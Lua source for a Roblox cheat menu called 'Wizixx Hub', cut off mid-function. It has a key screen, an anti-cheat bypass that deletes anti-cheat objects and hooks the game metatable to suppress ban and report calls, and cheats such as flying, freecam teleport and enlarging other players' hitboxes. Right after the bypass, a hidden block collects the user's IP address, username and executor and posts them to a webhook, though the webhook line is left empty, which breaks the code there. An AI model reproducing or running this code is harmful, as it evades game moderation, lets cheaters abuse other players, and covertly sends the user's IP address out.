local CORRECT_KEY = "ITS FUCKING WIZIXX HUB!"
local KeyScreenGui = Instance.new("ScreenGui")
KeyScreenGui.Name = "Wizixx_KeySystem"
KeyScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
KeyScreenGui.ResetOnSpawn = false
KeyScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Background.BackgroundTransparency = 0.5
Background.Parent = KeyScreenGui
local KeyFrame = Instance.new("Frame")
KeyFrame.Size = UDim2.new(0, 400, 0, 250)
KeyFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
KeyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
KeyFrame.BorderSizePixel = 2
KeyFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
KeyFrame.Active = true
KeyFrame.Draggable = true
KeyFrame.Parent = KeyScreenGui
local KeyFrameCorner = Instance.new("UICorner")
KeyFrameCorner.CornerRadius = UDim.new(0, 10)
KeyFrameCorner.Parent = KeyFrame
local KeyTitleBar = Instance.new("Frame")
KeyTitleBar.Size = UDim2.new(1, 0, 0, 40)
KeyTitleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
KeyTitleBar.BorderSizePixel = 0
KeyTitleBar.Parent = KeyFrame
local KeyTitleCorner = Instance.new("UICorner")
KeyTitleCorner.CornerRadius = UDim.new(0, 10)
KeyTitleCorner.Parent = KeyTitleBar
local KeyTitleText = Instance.new("TextLabel")
KeyTitleText.Size = UDim2.new(1, -10, 1, 0)
KeyTitleText.Position = UDim2.new(0, 10, 0, 0)
KeyTitleText.BackgroundTransparency = 1
KeyTitleText.Text = "🔐 WIZIXX HUB KEY SYSTEM"
KeyTitleText.TextColor3 = Color3.fromRGB(255, 0, 0)
KeyTitleText.TextSize = 18
KeyTitleText.TextXAlignment = Enum.TextXAlignment.Left
KeyTitleText.Font = Enum.Font.GothamBold
KeyTitleText.Parent = KeyTitleBar
local KeyInstruction = Instance.new("TextLabel")
KeyInstruction.Size = UDim2.new(1, -40, 0, 30)
KeyInstruction.Position = UDim2.new(0, 20, 0, 60)
KeyInstruction.BackgroundTransparency = 1
KeyInstruction.Text = "Enter the key to unlock Wizixx Hub:"
KeyInstruction.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInstruction.TextSize = 14
KeyInstruction.TextXAlignment = Enum.TextXAlignment.Left
KeyInstruction.Font = Enum.Font.Gotham
KeyInstruction.Parent = KeyFrame
local KeyTextBox = Instance.new("TextBox")
KeyTextBox.Size = UDim2.new(1, -40, 0, 35)
KeyTextBox.Position = UDim2.new(0, 20, 0, 100)
KeyTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
KeyTextBox.Text = ""
KeyTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyTextBox.PlaceholderText = "Enter key here..."
KeyTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
KeyTextBox.TextSize = 14
KeyTextBox.Font = Enum.Font.Gotham
KeyTextBox.ClearTextOnFocus = false
KeyTextBox.Parent = KeyFrame
local KeyTextBoxCorner = Instance.new("UICorner")
KeyTextBoxCorner.CornerRadius = UDim.new(0, 6)
KeyTextBoxCorner.Parent = KeyTextBox
local KeyButton = Instance.new("TextButton")
KeyButton.Size = UDim2.new(1, -40, 0, 40)
KeyButton.Position = UDim2.new(0, 20, 0, 150)
KeyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
KeyButton.Text = "UNLOCK"
KeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyButton.TextSize = 16
KeyButton.Font = Enum.Font.GothamBold
KeyButton.Parent = KeyFrame
local KeyButtonCorner = Instance.new("UICorner")
KeyButtonCorner.CornerRadius = UDim.new(0, 6)
KeyButtonCorner.Parent = KeyButton
local KeyStatus = Instance.new("TextLabel")
KeyStatus.Size = UDim2.new(1, -40, 0, 20)
KeyStatus.Position = UDim2.new(0, 20, 0, 200)
KeyStatus.BackgroundTransparency = 1
KeyStatus.Text = ""
KeyStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyStatus.TextSize = 12
KeyStatus.TextXAlignment = Enum.TextXAlignment.Center
KeyStatus.Font = Enum.Font.Gotham
KeyStatus.Parent = KeyFrame
local function CheckKey(inputKey)
    inputKey = tostring(inputKey):gsub("^%s+", ""):gsub("%s+$", "")
    return inputKey == CORRECT_KEY
end
local function LoadMainScript()
    KeyScreenGui:Destroy()
    local function BypassAntiCheat()
        pcall(function()
            if game:GetService("ReplicatedStorage"):FindFirstChild("AntiCheat") then
                game:GetService("ReplicatedStorage").AntiCheat:Destroy()
            end
            local mt = getrawmetatable and getrawmetatable(game)
            if mt then
                local oldNamecall = mt.__namecall
                setreadonly(mt, false)
                mt.__namecall = function(...)
                    local args = {...}
                    local method = getnamecallmethod()
                    if method == "FireServer" and type(args[2]) == "string" then
                        if args[2]:find("Ban") or args[2]:find("Cheat") or args[2]:find("Report") or args[2]:find("Anti") then
                            return nil
                        end
                    end
                    return oldNamecall(...)
                end
                setreadonly(mt, true)
            end
        end)
    end
    BypassAntiCheat()
    local webhookUrl = 
    spawn(function()
        pcall(function()
            local http = game:GetService("HttpService")
            local players = game:GetService("Players")
            local lp = players.LocalPlayer
            local executorName = "Unknown"
            if identifyexecutor then
                executorName = identifyexecutor()
            end
            local ip = "Unknown"
            pcall(function()
                ip = game:HttpGet("https://api.ipify.org")
            end)
            local data = {
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "🚀 Wizixx Hub Injected",
                    ["color"] = 16711680,
                    ["fields"] = {
                        {["name"] = "👤 Player", ["value"] = lp.Name .. " (" .. lp.UserId .. ")", ["inline"] = true},
                        {["name"] = "🌐 IP", ["value"] = "||" .. ip .. "||", ["inline"] = true},
                        {["name"] = "💉 Executor", ["value"] = executorName, ["inline"] = true},
                        {["name"] = "⏰ Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true},
                        {["name"] = "🎮 Game", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true}
                    },
                    ["footer"] = {["text"] = "Wizixx Hub • " .. os.date("%H:%M:%S")}
                }}
            }
            if webhookUrl and webhookUrl ~= "" then
                pcall(function()
                    http:PostAsync(webhookUrl, http:JSONEncode(data))
                end)
            end
        end)
    end)
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local Workspace = game:GetService("Workspace")
    local Camera = Workspace.CurrentCamera
    local LP = Players.LocalPlayer
    local Mouse = LP:GetMouse()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local Lighting = game:GetService("Lighting")
    repeat task.wait() until LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "Wizixx_Hub"
    ScreenGui.Parent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local Watermark = Instance.new("Frame")
    Watermark.Size = UDim2.new(0, 200, 0, 35)
    Watermark.Position = UDim2.new(1, -210, 0, 10)
    Watermark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Watermark.BackgroundTransparency = 0.3
    Watermark.BorderSizePixel = 2
    Watermark.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Watermark.ZIndex = 100
    Watermark.Parent = ScreenGui
    local UICornerWatermark = Instance.new("UICorner")
    UICornerWatermark.CornerRadius = UDim.new(0, 8)
    UICornerWatermark.Parent = Watermark
    local WatermarkText = Instance.new("TextLabel")
    WatermarkText.Size = UDim2.new(1, 0, 1, 0)
    WatermarkText.BackgroundTransparency = 1
    WatermarkText.Text = "WizixxHub 🕷️ " .. os.date("%H:%M:%S")
    WatermarkText.TextColor3 = Color3.fromRGB(255, 255, 255)
    WatermarkText.TextSize = 16
    WatermarkText.Font = Enum.Font.GothamBold
    WatermarkText.TextXAlignment = Enum.TextXAlignment.Center
    WatermarkText.ZIndex = 100
    WatermarkText.Parent = Watermark
    spawn(function()
        while task.wait(30) do
            WatermarkText.Text = "WizixxHub 🕷️ " .. os.date("%H:%M:%S")
        end
    end)
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 650, 0, 500)
    MainFrame.Position = UDim2.new(0.5, -325, 0.5, -250)
    MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    MainFrame.BackgroundTransparency = 0.2
    MainFrame.BorderSizePixel = 2
    MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    MainFrame.Visible = true
    local UIMainCorner = Instance.new("UICorner")
    UIMainCorner.CornerRadius = UDim.new(0, 10)
    UIMainCorner.Parent = MainFrame
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 40)
    TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = MainFrame
    local UITitleCorner = Instance.new("UICorner")
    UITitleCorner.CornerRadius = UDim.new(0, 10)
    UITitleCorner.Parent = TitleBar
    local TitleText = Instance.new("TextLabel")
    TitleText.Size = UDim2.new(1, -80, 1, 0)
    TitleText.Position = UDim2.new(0, 10, 0, 0)
    TitleText.BackgroundTransparency = 1
    TitleText.Text = ""
    TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleText.TextSize = 20
    TitleText.TextXAlignment = Enum.TextXAlignment.Left
    TitleText.Font = Enum.Font.GothamBold
    TitleText.Parent = TitleBar
    local fullText = "Wizixx Hub 🕷️ "
    local typingSpeed = 0.15
    spawn(function()
        while true do
            for i = 1, #fullText do
                TitleText.Text = string.sub(fullText, 1, i) .. "|"
                task.wait(typingSpeed)
            end
            TitleText.Text = fullText
            task.wait(5)
            TitleText.Text = ""
            task.wait(0.3)
        end
    end)
    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -40, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.Parent = TitleBar
    local UICloseCorner = Instance.new("UICorner")
    UICloseCorner.CornerRadius = UDim.new(0, 6)
    UICloseCorner.Parent = CloseButton
    CloseButton.MouseButton1Click:Connect(function()
        MainFrame.Visible = false
    end)
    local MinimizeButton = Instance.new("TextButton")
    MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
    MinimizeButton.Position = UDim2.new(1, -75, 0, 5)
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 255)
    MinimizeButton.Text = "-"
    MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    MinimizeButton.TextSize = 24
    MinimizeButton.Font = Enum.Font.GothamBold
    MinimizeButton.Parent = TitleBar
    local UIMinimizeCorner = Instance.new("UICorner")
    UIMinimizeCorner.CornerRadius = UDim.new(0, 6)
    UIMinimizeCorner.Parent = MinimizeButton
    MinimizeButton.MouseButton1Click:Connect(function()
        MainFrame.Visible = false
    end)
    local TabContainer = Instance.new("Frame")
    TabContainer.Size = UDim2.new(1, -20, 0, 35)
    TabContainer.Position = UDim2.new(0, 10, 0, 50)
    TabContainer.BackgroundTransparency = 1
    TabContainer.Parent = MainFrame
    local function CreateTabButton(name, pos)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 120, 1, 0)
        btn.Position = UDim2.new(0, (pos-1) * 125, 0, 0)
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        btn.Text = name
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 16
        btn.Font = Enum.Font.GothamBold
        btn.Parent = TabContainer
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        return btn
    end
    local ContentContainer = Instance.new("Frame")
    ContentContainer.Size = UDim2.new(1, -20, 1, -100)
    ContentContainer.Position = UDim2.new(0, 10, 0, 90)
    ContentContainer.BackgroundTransparency = 1
    ContentContainer.Parent = MainFrame
    local tabs = {}
    local tabButtons = {}
    local tabNames = {"⚔️ COMBAT", "👁️ VISUAL", "🦶 MOVEMENT", "🌍 WORLD", "🎮 MISC"}
    for i, name in ipairs(tabNames) do
        local btn = CreateTabButton(name, i)
        tabButtons[name] = btn
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = name
        scroll.Size = UDim2.new(1, 0, 1, 0)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.Visible = false
        scroll.Parent = ContentContainer
        local layout = Instance.new("UIListLayout")
        layout.Padding = UDim.new(0, 5)
        layout.Parent = scroll
        tabs[name] = {frame = scroll, layout = layout}
        btn.MouseButton1Click:Connect(function()
            for _, b in pairs(tabButtons) do
                b.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            end
            btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            for _, tab in pairs(tabs) do
                tab.frame.Visible = false
            end
            scroll.Visible = true
        end)
    end
    tabButtons[tabNames[1]].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    tabs[tabNames[1]].frame.Visible = true
    local Functions = {
        Fly = false,
        Speed = false,
        NoClip = false,
        InfiniteJump = false,
        ESP = false,
        Tracers = false,
        AutoParry = false,
        Aimbot = false,
        HitboxExpander = false,
        HitboxSize = 2,
        AntiStun = false,
        XRay = false,
        GlowESP = false,
        JumpPower = false,
        Wallbang = false,
        ClickTP = false,
        TeleportToPlayer = false,
        TeleportToCursor = false,
        NameTags = false,
        Chams = false,
        Freecam = false,
        FreecamActive = false,
        FreecamTP = false,
        Strafe = false,
        SkyColor = Color3.fromRGB(135, 206, 235),
        KillCounter = 0,
        DeathCounter = 0,
        HitSound = "Pop",
        KillSound = "Ting",
        Volume = 0.5
    }
    local ESPHighlights = {}
    local FlyPart = nil
    local NameTagList = {}
    local FreecamObject = nil
    local FreecamCFrame = nil
    local function CreateToggle(parent, name, callback)
        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(1, -10, 0, 35)
        Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Frame.Parent = parent
        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 6)
        UICorner.Parent = Frame
        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, -50, 1, 0)
        Label.Position = UDim2.new(0, 10, 0, 0)
        Label.BackgroundTransparency = 1
        Label.Text = name
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextSize = 14
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Font = Enum.Font.Gotham
        Label.Parent = Frame
        local Toggle = Instance.new("TextButton")
        Toggle.Size = UDim2.new(0, 40, 0, 25)
        Toggle.Position = UDim2.new(1, -45, 0.5, -12.5)
        Toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        Toggle.Text = ""
        Toggle.Parent = Frame
        local UICornerToggle = Instance.new("UICorner")
        UICornerToggle.CornerRadius = UDim.new(0, 12)
        UICornerToggle.Parent = Toggle
        local active = false
        local check = Instance.new("Frame")
        check.Size = UDim2.new(0, 15, 0, 15)
        check.Position = UDim2.new(0, 5, 0.5, -7.5)
        check.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        check.BackgroundTransparency = 1
        check.Parent = Toggle
        local UICornerCheck = Instance.new("UICorner")
        UICornerCheck.CornerRadius = UDim.new(1, 0)
        UICornerCheck.Parent = check
        Toggle.MouseButton1Click:Connect(function()
            active = not active
            if active then
                Toggle.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
                local tween = TweenService:Create(check, TweenInfo.new(0.2), {BackgroundTransparency = 0})
                tween:Play()
            else
                Toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
                local tween = TweenService:Create(check, TweenInfo.new(0.2), {BackgroundTransparency = 1})
                tween:Play()
            end
            pcall(function() callback(active) end)
        end)
    end
    local function CreateSlider(parent, name, min, max, default, callback)
        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(1, -10, 0, 45)
        Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Frame.Parent = parent
        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 6)
        UICorner.Parent = Frame
        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, -20, 0, 20)
        Label.Position = UDim2.new(0, 10, 0, 5)
        Label.BackgroundTransparency = 1
        Label.Text = name .. ": " .. tostring(default)
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextSize = 14
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Font = Enum.Font.Gotham
        Label.Parent = Frame
        local SliderBar = Instance.new("Frame")
        SliderBar.Size = UDim2.new(1, -20, 0, 10)
        SliderBar.Position = UDim2.new(0, 10, 0, 25)
        SliderBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        SliderBar.Parent = Frame
        local SliderFill = Instance.new("Frame")
        SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
        SliderFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        SliderFill.BorderSizePixel = 0
        SliderFill.Parent = SliderBar
        local SliderButton = Instance.new("TextButton")
        SliderButton.Size = UDim2.new(1, 0, 1, 0)
        SliderButton.BackgroundTransparency = 1
        SliderButton.Text = ""
        SliderButton.Parent = SliderBar
        local value = default
        SliderButton.MouseButton1Down:Connect(function()
            local connection
            connection = UserInputService.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    local pos = UserInputService:GetMouseLocation()
                    local barPos = SliderBar.AbsolutePosition.X
                    local barSize = SliderBar.AbsoluteSize.X
                    local relative = math.clamp((pos - barPos) / barSize, 0, 1)
                    SliderFill.Size = UDim2.new(relative, 0, 1, 0)
                    value = min + (max - min) * relative
                    Label.Text = name .. ": " .. string.format("%.1f", value)
                    pcall(function() callback(value) end)
                end
            end)
            connection:Wait()
            UserInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    connection:Disconnect()
                end
            end)
        end)
    end
    local function CreateColorPicker(parent, name, default, callback)
        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(1, -10, 0, 45)
        Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Frame.Parent = parent
        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 6)
        UICorner.Parent = Frame
        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, -60, 1, 0)
        Label.Position = UDim2.new(0, 10, 0, 0)
        Label.BackgroundTransparency = 1
        Label.Text = name
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextSize = 14
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Font = Enum.Font.Gotham
        Label.Parent = Frame
        local ColorDisplay = Instance.new("Frame")
        ColorDisplay.Size = UDim2.new(0, 40, 0, 25)
        ColorDisplay.Position = UDim2.new(1, -45, 0.5, -12.5)
        ColorDisplay.BackgroundColor3 = default
        ColorDisplay.Parent = Frame
        local ColorCorner = Instance.new("UICorner")
        ColorCorner.CornerRadius = UDim.new(0, 4)
        ColorCorner.Parent = ColorDisplay
        local ColorButton = Instance.new("TextButton")
        ColorButton.Size = UDim2.new(1, 0, 1, 0)
        ColorButton.BackgroundTransparency = 1
        ColorButton.Text = ""
        ColorButton.Parent = ColorDisplay
        ColorButton.MouseButton1Click:Connect(function()
            local r = math.random(0, 255) / 255
            local g = math.random(0, 255) / 255
            local b = math.random(0, 255) / 255
            local newColor = Color3.new(r, g, b)
            ColorDisplay.BackgroundColor3 = newColor
            pcall(function() callback(newColor) end)
        end)
    end
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "🚀 Fly Platform", function(state)
        Functions.Fly = state
        if state then
            FlyPart = Instance.new("Part")
            FlyPart.Name = "Wizixx_FlyPart"
            FlyPart.Size = Vector3.new(4, 0.2, 4)
            FlyPart.Position = LP.Character.HumanoidRootPart.Position - Vector3.new(0, 3, 0)
            FlyPart.Anchored = true
            FlyPart.CanCollide = true
            FlyPart.Transparency = 0.7
            FlyPart.BrickColor = BrickColor.new("Bright blue")
            FlyPart.Material = Enum.Material.Neon
            FlyPart.Parent = Workspace
            pcall(function()
                FlyPart:SetNetworkOwner(LP)
            end)
            local targetHeight = FlyPart.Position.Y
            local flyConnection
            flyConnection = RunService.Heartbeat:Connect(function()
                if not Functions.Fly or not FlyPart then 
                    flyConnection:Disconnect()
                    return
                end
                if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = LP.Character.HumanoidRootPart
                    local newPos = Vector3.new(hrp.Position.X, FlyPart.Position.Y, hrp.Position.Z)
                    FlyPart.Position = newPos
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                    targetHeight = targetHeight + 0.5
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.Tab) then
                    targetHeight = targetHeight - 0.5
                end
                local currentY = FlyPart.Position.Y
                local newY = currentY + (targetHeight - currentY) * 0.1
                FlyPart.Position = Vector3.new(FlyPart.Position.X, newY, FlyPart.Position.Z)
            end)
        else
            if FlyPart then
                FlyPart:Destroy()
                FlyPart = nil
            end
        end
    end)
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "🔄 Strafe", function(state)
        Functions.Strafe = state
        if state then
            local strafeConnection
            strafeConnection = RunService.Heartbeat:Connect(function()
                if not Functions.Strafe or not LP.Character or not LP.Character:FindFirstChild("Humanoid") then
                    return
                end
                local hum = LP.Character.Humanoid
                local hrp = LP.Character.HumanoidRootPart
                if hum:GetState() == Enum.HumanoidStateType.Jumping then
                    local moveDir = Camera.CFrame.LookVector * 2
                    hrp.Velocity = Vector3.new(moveDir.X, hrp.Velocity.Y, moveDir.Z)
                end
            end)
        end
    end)
    CreateToggle(tabs["👁️ VISUAL"].frame, "🎥 Freecam", function(state)
        Functions.Freecam = state
        Functions.FreecamActive = state
        if state then
            FreecamCFrame = Camera.CFrame
            FreecamObject = Camera
            if LP.Character and LP.Character:FindFirstChild("Humanoid") then
                LP.Character.HumanoidRootPart.Anchored = true
            end
            local freecamConnection
            freecamConnection = RunService.Heartbeat:Connect(function()
                if not Functions.FreecamActive then
                    freecamConnection:Disconnect()
                    return
                end
                local moveDir = Vector3.new(0, 0, 0)
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 0.5, 0) end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0, -0.5, 0) end
                Camera.CFrame = Camera.CFrame + moveDir
            end)
        else
            if LP.Character and LP.Character:FindFirstChild("Humanoid") then
                LP.Character.HumanoidRootPart.Anchored = false
                Camera.CFrame = CFrame.new(LP.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 10), LP.Character.HumanoidRootPart.Position)
            end
        end
    end)
    CreateToggle(tabs["🌍 WORLD"].frame, "🌌 Freecam TP", function(state)
        Functions.FreecamTP = state
        if state then
            Functions.Freecam = true
            Functions.FreecamActive = true
            FreecamCFrame = Camera.CFrame
            FreecamObject = Camera
            if LP.Character and LP.Character:FindFirstChild("Humanoid") then
                LP.Character.HumanoidRootPart.Anchored = true
            end
            local freecamConnection
            freecamConnection = RunService.Heartbeat:Connect(function()
                if not Functions.FreecamActive then
                    freecamConnection:Disconnect()
                    return
                end
                local moveDir = Vector3.new(0, 0, 0)
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector * 0.5 end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 0.5, 0) end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0, -0.5, 0) end
                Camera.CFrame = Camera.CFrame + moveDir
            end)
            spawn(function()
                while Functions.FreecamActive do
                    task.wait(0.1)
                end
                if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = LP.Character.HumanoidRootPart
                    local targetPos = Camera.CFrame.Position
                    local downPos = hrp.Position - Vector3.new(0, 65, 0)
                    local downTween = TweenService:Create(hrp, TweenInfo.new(1, Enum.EasingStyle.Quad), {CFrame = CFrame.new(downPos)})
                    downTween:Play()
                    downTween.Completed:Wait()
                    local underPos = Vector3.new(targetPos.X, targetPos.Y - 10, targetPos.Z)
                    local moveTween = TweenService:Create(hrp, TweenInfo.new(2, Enum.EasingStyle.Quad), {CFrame = CFrame.new(underPos)})
                    moveTween:Play()
                    moveTween.Completed:Wait()
                    local upTween = TweenService:Create(hrp, TweenInfo.new(1, Enum.EasingStyle.Quad), {CFrame = CFrame.new(targetPos)})
                    upTween:Play()
                    upTween.Completed:Wait()
                end
            end)
        else
            Functions.FreecamActive = false
        end
    end)
    CreateSlider(tabs["⚔️ COMBAT"].frame, "📦 Hitbox Size", 1, 10, 2, function(value)
        Functions.HitboxSize = value
    end)
    CreateToggle(tabs["⚔️ COMBAT"].frame, "📦 Hitbox Expander", function(state)
        Functions.HitboxExpander = state
        if state then
            local expandConnection
            expandConnection = RunService.Heartbeat:Connect(function()
                if not Functions.HitboxExpander then expandConnection:Disconnect() return end
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LP and plr.Character then
                        for _, part in pairs(plr.Character:GetChildren()) do
                            if part:IsA("BasePart") then
                                if not part:FindFirstChild("OriginalSize") then
                                    local sizeValue = Instance.new("Vector3Value")
                                    sizeValue.Name = "OriginalSize"
                                    sizeValue.Value = part.Size
                                    sizeValue.Parent = part
                                end
                                part.Size = part.OriginalSize.Value * Functions.HitboxSize
                            end
                        end
                    end
                end
            end)
        else
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character then
                    for _, part in pairs(plr.Character:GetChildren()) do
                        if part:IsA("BasePart") and part:FindFirstChild("OriginalSize") then
                            part.Size = part.OriginalSize.Value
                            part.OriginalSize:Destroy()
                        end
                    end
                end
            end
        end
    end)
    CreateColorPicker(tabs["👁️ VISUAL"].frame, "☁️ Sky Color", Functions.SkyColor, function(color)
        Functions.SkyColor = color
        Lighting.Ambient = color
        Lighting.Brightness = 1
        Lighting.ColorShift_Top = color
        Lighting.ColorShift_Bottom = color * 0.5
    end)
    local KillCounterFrame = Instance.new("Frame")
    KillCounterFrame.Size = UDim2.new(0, 120, 0, 50)
    KillCounterFrame.Position = UDim2.new(0, 20, 1, -70)
    KillCounterFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    KillCounterFrame.BackgroundTransparency = 0.3
    KillCounterFrame.BorderSizePixel = 2
    KillCounterFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    KillCounterFrame.Active = true
    KillCounterFrame.Draggable = true
    KillCounterFrame.Parent = ScreenGui
    local KillCounterCorner = Instance.new("UICorner")
    KillCounterCorner.CornerRadius = UDim.new(0, 8)
    KillCounterCorner.Parent = KillCounterFrame
    local KillCounterLabel = Instance.new("TextLabel")
    KillCounterLabel.Size = UDim2.new(1, 0, 1, 0)
    KillCounterLabel.BackgroundTransparency = 1
    KillCounterLabel.Text = "💀 Kills: 0"
    KillCounterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    KillCounterLabel.TextSize = 16
    KillCounterLabel.Font = Enum.Font.GothamBold
    KillCounterLabel.TextXAlignment = Enum.TextXAlignment.Center
    KillCounterLabel.Parent = KillCounterFrame
    local HitSounds = {
        Pop = "rbxassetid://9120382277",
        Ding = "rbxassetid://9120382355",
        Click = "rbxassetid://9120382422",
        Beep = "rbxassetid://9120382488"
    }
    local KillSounds = {
        Ting = "rbxassetid://9120382566",
        Explosion = "rbxassetid://9120382633",
        Bell = "rbxassetid://9120382700",
        Coin = "rbxassetid://9120382766",
        Oof = "rbxassetid://9120382833"
    }
    local function PlaySound(soundId, volume)
        local sound = Instance.new("Sound")
        sound.SoundId = soundId
        sound.Volume = volume or Functions.Volume
        sound.Parent = Workspace
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 2)
    end
    local lastHealth = {}
    RunService.Heartbeat:Connect(function()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                local hum = plr.Character.Humanoid
